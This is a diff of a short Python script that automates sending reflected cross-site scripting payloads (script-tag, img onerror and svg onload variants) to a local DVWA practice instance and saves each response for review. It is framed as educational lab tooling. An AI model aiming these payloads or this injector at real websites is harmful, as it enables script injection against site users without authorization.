@@ -1,60 +1,61 @@
 #!/usr/bin/env python3
+"""
+Author: Syed Raihaan
+Project: XSS Payload Injector
+Description:
+  Automates sending XSS payloads to DVWA (Damn Vulnerable Web App) or similar test targets.
+  This is for educational purposes only — never test on unauthorized systems.
+
+Usage:
+  - Edit TARGET_URL, COOKIES, HEADERS, and PAYLOADS as needed.
+  - Run: python payload_injector.py
+"""
 
 import requests
 
-# ---------------------------
-# ✅ CONFIGURATION
-# ---------------------------
+# -----------------------------
+# Config: Update these for your environment
+# -----------------------------
 
+# Example: DVWA running locally in Docker on port 8080
 TARGET_URL = "http://127.0.0.1:8080/vulnerabilities/xss_r/"
-PARAM_NAME = "name"
 
+# Example cookies: adjust PHPSESSID and security level
 COOKIES = {
-    "PHPSESSID": "cq6h1rp6qj01532fivhbli1au1",
+    "PHPSESSID": "your_session_id_here",
     "security": "low"
 }
 
 HEADERS = {
-    "Host": "127.0.0.1:8080",
-    "sec-ch-ua": '"Not?A_Brand";v="99", "Chromium";v="130"',
-    "sec-ch-ua-mobile": "?0",
-    "sec-ch-ua-platform": '"Linux"',
-    "Accept-Language": "en-US,en;q=0.9",
-    "Upgrade-Insecure-Requests": "1",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "Sec-Fetch-Site": "same-origin",
-    "Sec-Fetch-Mode": "navigate",
-    "Sec-Fetch-User": "?1",
-    "Sec-Fetch-Dest": "document",
-    "Referer": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Connection": "keep-alive"
+    "User-Agent": "Mozilla/5.0 (XSS Injector)",
+    "Accept": "text/html,application/xhtml+xml",
+    "Referer": TARGET_URL
 }
 
-# Your test payload
-payload = "<script>alert(1)</script>"
+# Example XSS payloads
+PAYLOADS = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "\"><svg/onload=alert('Injected!')>"
+]
 
-# ---------------------------
-# ✅ SEND THE REQUEST
-# ---------------------------
-def main():
-    params = {PARAM_NAME: payload}
+# -----------------------------
+# Main logic
+# -----------------------------
+
+def send_payload(payload):
+    params = {"name": payload}
+    print(f"[*] Sending payload: {payload}")
     response = requests.get(TARGET_URL, headers=HEADERS, cookies=COOKIES, params=params)
+    return response.text
 
-    print(f"[+] Sent payload: {payload}")
-    print(f"[+] Response URL: {response.url}")
-    print(f"[+] Status Code: {response.status_code}")
-
-    if payload in response.text:
-        print("\n[🔥] Payload reflected in response! Possible XSS.\n")
-    else:
-        print("\n[⚠️] Payload not reflected. Check manually.\n")
-
-    # Save response to file for manual review
-    with open("response.html", "w", encoding="utf-8") as f:
-        f.write(response.text)
-    print("[+] Saved response as response.html")
+def main():
+    for payload in PAYLOADS:
+        html = send_payload(payload)
+        filename = f"response_{payload[:5].replace('<','').replace('>','')}.html"
+        with open(filename, "w", encoding="utf-8") as f:
+            f.write(html)
+        print(f"[+] Saved response to {filename}")
 
 if __name__ == "__main__":
     main()
